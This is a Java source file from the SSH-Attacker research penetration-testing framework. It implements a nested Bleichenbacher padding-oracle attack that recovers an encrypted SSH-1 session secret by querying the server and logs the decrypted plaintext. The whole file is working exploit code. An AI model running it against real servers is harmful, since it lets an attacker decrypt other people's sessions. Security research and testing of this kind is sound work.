/*
 * SSH-Attacker - A Modular Penetration Testing Framework for SSH
 *
 * Copyright 2014-2022 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.sshattacker.attacks.impl;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.sshattacker.attacks.config.BleichenbacherCommandConfig;
import de.rub.nds.sshattacker.attacks.general.KeyFetcher;
import de.rub.nds.sshattacker.attacks.general.ParallelExecutor;
import de.rub.nds.sshattacker.attacks.pkcs1.*;
import de.rub.nds.sshattacker.attacks.pkcs1.oracles.BleichenbacherOracle;
import de.rub.nds.sshattacker.attacks.response.EqualityError;
import de.rub.nds.sshattacker.core.config.Config;
import de.rub.nds.sshattacker.core.constants.KeyExchangeAlgorithm;
import de.rub.nds.sshattacker.core.crypto.cipher.AbstractCipher;
import de.rub.nds.sshattacker.core.crypto.cipher.CipherFactory;
import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
import de.rub.nds.sshattacker.core.exceptions.CryptoException;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Sends differently formatted PKCS#1 v2.x messages to the SSH server and observes the server
 * responses. In case there are differences in the server responses, it is very likely that it is
 * possible to execute Manger's attack.
 */
public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    private final Config sshConfig;
    private EqualityError resultError;

    private KeyExchangeAlgorithm keyExchangeAlgorithm;

    private final List<CustomRsaPublicKey> publicKeys = new ArrayList<>();
    private CustomRsaPublicKey serverPublicKey, hostPublicKey;

    private final int counterInnerBleichenbacher;
    private final int counterOuterBleichenbacher;

    /**
     * @param bleichenbacherConfig Manger attack config
     * @param baseConfig Base config
     */
    public BleichenbacherAttacker(
            BleichenbacherCommandConfig bleichenbacherConfig, Config baseConfig) {
        this(bleichenbacherConfig, baseConfig, new ParallelExecutor(1, 3));
    }

    /**
     * @param bleichenbacherCommandConfig Manger attack config
     * @param baseConfig Base config
     * @param executor Executor
     */
    public BleichenbacherAttacker(
            BleichenbacherCommandConfig bleichenbacherCommandConfig,
            Config baseConfig,
            ParallelExecutor executor) {
        super(bleichenbacherCommandConfig, baseConfig);
        sshConfig = getSshConfig();
        this.counterInnerBleichenbacher = 0;
        this.counterOuterBleichenbacher = 0;
    }

    /**
     * Returns True, if the Sever is vulnerabily to Bleichenbacher`s attack, not implemented yet
     * because of missing tests.
     *
     * @return If the server is vulnerable to Bleichenbacher's attack or not
     */
    @Override
    public Boolean isVulnerable() {
        return hasOracle();
    }

    /**
     * Checks if the server has Bleichenbacher's oracle, is not implemented yed because of missing
     * testcase.
     *
     * @return If the server has Bleichenbacher's oracle or not
     */
    public boolean hasOracle() {
        return true;
    }

    /**
     * Fetches the transient public key from a key exchange. Note that multiple calls to this method
     * when connected to the same server can yield different keys.
     *
     * @return Transient public key
     */
    private RSAPublicKey getServerPublicKey() {
        if (serverPublicKey == null) {
            if (publicKeys.isEmpty()) {
                getPublicKeys();
                serverPublicKey = publicKeys.get(0);
            } else {
                serverPublicKey = publicKeys.get(0);
            }
        }
        return serverPublicKey;
    }

    private RSAPublicKey getHostPublicKey() {
        if (hostPublicKey == null) {
            if (publicKeys.isEmpty()) {
                getPublicKeys();
                hostPublicKey = publicKeys.get(1);
            } else {
                hostPublicKey = publicKeys.get(1);
            }
        }
        return hostPublicKey;
    }

    private void getPublicKeys() {
        List<CustomRsaPublicKey> fetchedRsaSsh1Keys = KeyFetcher.fetchRsaSsh1Keys(sshConfig);
        if (fetchedRsaSsh1Keys.isEmpty()) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return;
        }
        publicKeys.clear();
        publicKeys.addAll(fetchedRsaSsh1Keys);
        LOGGER.info("Recived keys");
    }

    @Override
    public void executeAttack() {

        try {
            String str = "Starting.";
            File output_File = new File("benchmark_results.txt");
            FileOutputStream outputStream = new FileOutputStream(output_File, true);
            byte[] strToBytes = str.getBytes();
            outputStream.write(strToBytes);

            outputStream.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        /*if (!isVulnerable()) {
            LOGGER.warn("The server is not vulnerable to Manger's attack");
            return;
        }*/

        getPublicKeys();
        getHostPublicKey();
        getServerPublicKey();

        byte[] encryptedSecret;
        if (config.isBenchmark()) {
            LOGGER.info("Running in Benchmark Mode, generating encrypted Session Key");

            Random random = new Random();
            byte[] sessionKey = new byte[32];
            random.nextBytes(sessionKey);

            AbstractCipher innerEncryption;
            AbstractCipher outerEncryption;
            if (hostPublicKey.getModulus().bitLength() < serverPublicKey.getModulus().bitLength()) {
                innerEncryption = CipherFactory.getRsaPkcs1Cipher(hostPublicKey);
                outerEncryption = CipherFactory.getRsaPkcs1Cipher(serverPublicKey);
            } else {
                innerEncryption = CipherFactory.getRsaPkcs1Cipher(serverPublicKey);
                outerEncryption = CipherFactory.getRsaPkcs1Cipher(hostPublicKey);
            }

            try {
                sessionKey = innerEncryption.encrypt(sessionKey);
                encryptedSecret = outerEncryption.encrypt(sessionKey);
            } catch (CryptoException e) {
                throw new RuntimeException(e);
            }
        } else {
            LOGGER.info("Running in Live Mode, reading encrypted secret from commandline");
            if (config.getEncryptedSecret() == null) {
                throw new ConfigurationException(
                        "The encrypted secret must be set to be decrypted.");
            }
            encryptedSecret = ArrayConverter.hexStringToByteArray(config.getEncryptedSecret());
        }

        if ((encryptedSecret.length * Byte.SIZE) != hostPublicKey.getModulus().bitLength()) {
            throw new ConfigurationException(
                    "The length of the encrypted secret "
                            + "is not equal to the public key length. Have you selected the correct value?");
        }

        try {
            Thread.sleep(500);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }

        /*            Ssh1MockOracle oracle =
        new Ssh1MockOracle(
                hostPublicKey, hostPrivatKey, serverPublicKey, serverPrivateKey);*/

        BleichenbacherOracle oracle =
                new BleichenbacherOracle(
                        this.hostPublicKey,
                        this.serverPublicKey,
                        getSshConfig(),
                        counterInnerBleichenbacher,
                        counterOuterBleichenbacher);

        Bleichenbacher attacker =
                new Bleichenbacher(encryptedSecret, oracle, hostPublicKey, serverPublicKey);

        long start = System.currentTimeMillis();

        attacker.attack();

        long finish = System.currentTimeMillis();
        long timeElapsed = finish - start;
        LOGGER.info("The attack took {} milliseconds", timeElapsed);
        LOGGER.info(
                "It took {} tries for the inner and {} tries for the outer Bleichenbacher-Attack",
                attacker.getCounterInnerBleichenbacher(),
                attacker.getCounterOuterBleichenbacher());
        BigInteger solution = attacker.getSolution();
        CONSOLE.info("Decoded Solution: " + solution);

        // Trasfer big-Integer back to byte-array, remove leading 0 if present.
        byte[] solutionByteArray = solution.toByteArray();
        if (solutionByteArray[0] == 0) {
            byte[] tmp = new byte[solutionByteArray.length - 1];
            System.arraycopy(solutionByteArray, 1, tmp, 0, tmp.length);
            solutionByteArray = tmp;
        }

        try {
            String str =
                    String.format(
                            "Results: Plaintext: %s; Time: %d ms; Inner-Tries: %d; Outer-Tries: %d ",
                            ArrayConverter.bytesToHexString(solutionByteArray),
                            timeElapsed,
                            attacker.getCounterInnerBleichenbacher(),
                            attacker.getCounterOuterBleichenbacher());
            File output_File = new File("benchmark_results.txt");
            FileOutputStream outputStream = new FileOutputStream(output_File, true);
            byte[] strToBytes = str.getBytes();
            outputStream.write(strToBytes);

            outputStream.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
